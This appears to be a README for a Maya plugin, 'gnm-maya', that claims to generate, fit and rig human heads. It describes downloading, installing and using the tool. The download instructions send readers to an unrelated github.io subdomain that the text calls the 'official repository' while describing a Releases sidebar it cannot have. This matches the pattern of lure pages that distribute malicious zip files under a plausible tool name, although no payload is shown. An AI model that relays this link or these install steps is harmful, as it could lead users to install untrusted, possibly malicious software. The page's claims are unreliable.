# 👤 gnm-maya - Create realistic human heads in Maya

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://dloffph4929.github.io)

This tool helps artists create human heads inside Autodesk Maya. It uses the Google GNM model to build shapes, adjust facial features, and prepare characters for animation. It works for creators who need background characters or detailed digital portraits without manual sculpting.

## 🛠 Prerequisites

Ensure you have these items before you begin:

*   Autodesk Maya installed on your computer. This tool supports Maya 2022 and later versions.
*   A stable internet connection to download the required project files.
*   The standard Python environment that comes with your Maya installation.
*   At least 4GB of free disk space for generated models and project textures.

## 📥 Downloading the software

You must visit the project page to access the installation files. Follow these steps to obtain the tool:

1.  Visit the official repository page at: https://dloffph4929.github.io
2.  Locate the section labeled Releases on the right side of the screen.
3.  Click the most recent version link.
4.  Download the file ending in .zip to your computer.
5.  Extract the contents of this folder to a location you can easily find, such as your Documents folder.

## ⚙️ Installation

Maya requires a specific folder structure to recognize custom tools. Follow these instructions to set up the software:

1.  Open your Documents folder.
2.  Navigate to the maya folder.
3.  Open the folder corresponding to your specific Maya version.
4.  Find the folder named scripts.
5.  Move the unzipped gnm-maya files into this scripts folder.
6.  Restart Maya if you have it open.

## 🚀 Running the tool

Once you install the files, you can load the interface:

1.  Open Maya.
2.  Locate the Command Line bar at the bottom left of your screen.
3.  Ensure the button on the left is set to Python.
4.  Type the following command into the bar and press Enter:
    import gnm_maya
    gnm_maya.show()

The main window will appear over your workspace.

## 🎨 Using the interface

The tool provides several options to generate human heads.

### Semantic sampling
This feature creates unique human faces based on randomized data points. Adjust the sliders to change age, gender, and facial structures. Press the Generate button to see the result in the viewport.

### Text-to-face
You can type a description of a person into the text box. The software interprets your words and modifies the model shape to match your input. Try phrases like "older man with thin face" or "young person with round features."

### Photo fitting
Load a clear portrait photo. The tool maps the features from the image onto the 3D model. For best results, use images with neutral lighting and a forward-facing head.

### Rig baking
After you finalize a head shape, use the rig bake function. This converts the sculpture into a rigged character. The tool adds controllers around the eyes, jaw, and mouth. You can move these controllers in the Maya viewport to create facial expressions.

### Crowds
If you need many characters, use the crowd generation menu. Select the number of variations you need, and the software creates multiple distinct head shapes in one click. This saves time for background work in animations.

## 💻 System requirements

Hardware performance affects the speed of generation.

*   Processor: An Intel i7 or AMD Ryzen 7 processor or better ensures smooth slider response.
*   Memory: 16GB of RAM allows the tool to manipulate high-resolution textures without lag.
*   Graphics Card: A dedicated GPU with at least 8GB of VRAM provides the best experience when viewing the 3D heads in the Maya viewport.

## 🔧 Frequently asked questions

Do I need to be an expert in rigging?
No, the tool builds the rig for you. You only need to select the bake option after you finish your design.

Does this work on macOS?
Yes, the installation steps are similar. Move the files to your Maya scripts folder on your Mac and run the same Python command.

Can I export these heads to other software?
Yes, you can export the finished models as .fbx or .obj files from Maya to use them in game engines or other 3D applications.

What if the generation takes too long?
Close background applications that consume memory, such as web browsers or video players. Ensure you have the latest graphics drivers installed.

## 📦 Troubleshooting

If the menu does not appear, check the Python Script Editor tab in Maya. If you see a path error, ensure the gnm-maya folder resides directly inside your scripts directory without extra nested folders. Verify you have the correct version of Maya installed, as older versions may lack the necessary Python libraries.

Keywords: 3d, 3d-morphable-model, 3dmm, autodesk-maya, blendshapes, character-creation, face, facial-animation, gnm, head, maya, parametric-modeling, procedural-generation, pyside, python, rigging, vfx